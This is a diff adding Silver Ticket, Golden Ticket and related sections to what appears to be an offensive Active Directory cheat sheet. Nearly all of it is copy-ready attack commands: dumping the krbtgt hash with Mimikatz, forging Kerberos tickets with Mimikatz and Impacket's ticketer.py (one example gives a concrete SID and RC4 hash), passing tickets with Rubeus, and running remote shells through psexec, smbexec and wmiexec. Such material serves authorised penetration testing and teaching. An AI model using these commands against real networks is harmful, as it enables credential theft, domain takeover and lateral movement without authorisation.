@@ -296,3 +296,167 @@ bloodhound-python -u user -p password -ns 192.168.1.5 -d hacktor.local -c All
 ```
 
 <figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+### Silver Ticket
+
+* Mimikatz
+  * with NTLM
+
+{% code overflow="wrap" %}
+```powershell
+mimikatz # kerberos::golden /domain:$DOMAIN/sid:$DOMAIN_SID /rc4:$NTLM_HASH /user:$DOMAIN_USER /service:$SERVICE_SPN /target:$SERVICE_MACHINE_HOSTNAME
+```
+{% endcode %}
+
+* with aesKey
+
+{% code overflow="wrap" %}
+```powershell
+mimikatz # kerberos::golden /domain:$DOMAIN/sid:$DOMAIN_SID /aes128:$KRBTGT_AES_128_KEY /user:$DOMAIN_USER /service:$SERVICE_SPN /target:$SERVICE_MACHINE_HOSTNAME
+```
+{% endcode %}
+
+* with Mimikatz
+
+```powershell
+mimikatz # kerberos::ptt <ticket_kirbi_file>
+```
+
+{% embed url="https://github.com/gentilkiwi/mimikatz" %}
+
+* Rubeus
+
+```powershell
+Rubeus.exe ptt /ticket:<ticket_kirbi_file>
+```
+
+{% embed url="https://github.com/GhostPack/Rubeus" %}
+
+* PsExec
+
+```powershell
+PsExec.exe -accepteula \\$REMOTE_HOSTNAME cmd
+```
+
+* in Kali Linux
+
+### Impacket
+
+* Commands
+  * with NTLM
+
+{% code overflow="wrap" %}
+```powershell
+ticketer.py -nthash $NTLM_HASH -domain-sid $DOMAIN_SID -domain $DOMAIN -SPN $SERVICE_SPN $DOMAIN_USER
+```
+{% endcode %}
+
+* with aesKey
+
+{% code overflow="wrap" %}
+```powershell
+ticketer.py -aesKey $AES_KEY -domain-sid $DOMAIN_SID -domain $DOMAIN -SPN $SERVICE_SPN $DOMAIN_USER
+```
+{% endcode %}
+
+* Set TGT for impacket use
+
+```basic
+export KRB5CCNAME=<TGT_ccache_file>
+```
+
+* Execute remote commands
+  * `psexec.py $DOMAIN/$DOMAIN_USER@$REMOTE_HOSTNAME -k -no-pass`
+  * `smbexec.py $DOMAIN/$DOMAIN_USER@$REMOTE_HOSTNAME -k -no-pass`
+  * `wmiexec.py $DOMAIN/$DOMAIN_USER@$REMOTE_HOSTNAME -k -no-pass`
+* [Impacket](https://github.com/SecureAuthCorp/impacket/releases/)
+
+### Golden Ticket
+
+* in PowerShell
+* Mimikatz
+
+Extracting the krbtgt account's password `NTLM` hash:
+
+```bash
+mimikatz # lsadump::lsa /inject /name:krbtgt
+```
+
+<figure><img src="../../../.gitbook/assets/image (181).png" alt=""><figcaption></figcaption></figure>
+
+Creating a forged golden ticket that automatically gets injected in current logon session's memory:
+
+{% code overflow="wrap" %}
+```
+mimikatz # kerberos::golden /domain:offense.local /sid:S-1-5-21-4172452648-1021989953-2368502130 /rc4:8584cfccd24f6a7f49ee56355d41bd30 /user:newAdmin /id:500 /ptt
+```
+{% endcode %}
+
+<figure><img src="../../../.gitbook/assets/image (183).png" alt=""><figcaption></figcaption></figure>
+
+* with aesKey
+
+{% code overflow="wrap" %}
+```
+mimikatz # kerberos::golden /domain:$DOMAIN/sid:$DOMAIN_SID /aes128:$KRBTGT_AES_128_KEY /user:$DOMAIN_USER /target:$SERVICE_MACHINE_HOSTNAME
+```
+{% endcode %}
+
+* with Mimikatz
+
+```
+mimikatz # kerberos::ptt <ticket_kirbi_file>
+```
+
+* [Mimikatz](https://github.com/gentilkiwi/mimikatz)
+* Rubeus
+
+```
+Rubeus.exe ptt /ticket:<ticket_kirbi_file>
+```
+
+* [Rubeus](https://github.com/GhostPack/Rubeus)
+* PsExec
+
+```
+PsExec.exe -accepteula \\$REMOTE_HOSTNAME cmd
+```
+
+* in Kali Linux
+  * Impacket
+  * with NTLM
+
+{% code overflow="wrap" %}
+```
+ticketer.py -nthash $KRBTGT_NTLM_HASH -domain-sid $DOMAIN_SID -domain $DOMAIN $DOMAIN_USER
+```
+{% endcode %}
+
+* with aesKey
+
+{% code overflow="wrap" %}
+```
+ticketer.py -aesKey $AES_KEY -domain-sid $DOMAIN_SID -domain $DOMAIN $DOMAIN_USER
+```
+{% endcode %}
+
+* Set TGT for impacket use
+
+```powershell
+export KRB5CCNAME=<TGT_ccache_file>
+```
+
+* Execute remote commands
+  * `psexec.py $DOMAIN/$DOMAIN_USER@$REMOTE_HOSTNAME -k -no-pass`
+  * `smbexec.py $DOMAIN/$DOMAIN_USER@$REMOTE_HOSTNAME -k -no-pass`
+  * `wmiexec.py $DOMAIN/$DOMAIN_USER@$REMOTE_HOSTNAME -k -no-pass`
+* [Impacket](https://github.com/SecureAuthCorp/impacket/releases/)
+
+### Skeleton Ticket
+
+#### Extra Mile
+
+* NTLM from password
+  * `python -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "<password>".encode("utf-16le")).digest())'`
+* [Cheatsheet](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)
+* [Mimikatz History](https://ivanitlearning.wordpress.com/2019/09/07/mimikatz-and-password-dumps/)
